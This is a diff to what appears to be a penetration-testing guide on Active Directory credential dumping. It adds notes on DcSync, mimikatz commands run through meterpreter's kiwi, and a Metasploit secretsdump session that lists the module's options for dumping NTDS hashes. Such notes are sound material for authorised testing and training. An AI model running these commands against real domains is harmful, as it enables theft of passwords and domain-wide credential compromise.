@@ -145,7 +145,8 @@ The NTDS.dit, is a database that is usually stored on the Domain Controllers. Th
 
 **DcSync:**
 
-The main advantatge of this techique is that is less noisy than dumping the NTDS
+The main advantatge of this techique is that is less noisy than dumping the entire NTDS.
+
 The domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges.
 
 In a nutshell, to be able to perform DcSync we must: be a domain admin or make the DcSync from a computer that has domain replication permissions.
@@ -203,9 +204,29 @@ To read LAPS:
 Alternatively, you can use "kiwi_cmd" from a meterpreter shell to execute any mimikatz command:
 
 ```
+#From a meterpreter session
 1. load kiwi
 2. kiwi_cmd "sekurlsa::logonpasswords"
 ```
 
-Dumping the NTDS from metaspoit:
+Dumping the NTDS from metaspoit(using auxiliary/scanner/smb/impacket/secretsdump module):
 
+```
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/impacket/secretsdump
+[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/impacket/secretsdump) >> options
+
+Module options (auxiliary/scanner/smb/impacket/secretsdump):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   ExecMethod  smbexec          yes       The method to use for execution (Accepted: smbexec, wmiexec, mmcexec)
+   OutputFile                   no        Write the results to a file
+   RHOSTS                       yes       The target host(s), see https://github.com/rapid7/metasploit-framewo
+                                          rk/wiki/Using-Metasploit
+   SMBDomain   .                no        The Windows domain to use for authentication
+   SMBPass                      yes       The password for the specified username
+   SMBUser                      yes       The username to authenticate as
+   THREADS     1                yes       The number of concurrent threads (max one per host)
+
+[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/impacket/secretsdump) >> 
+```
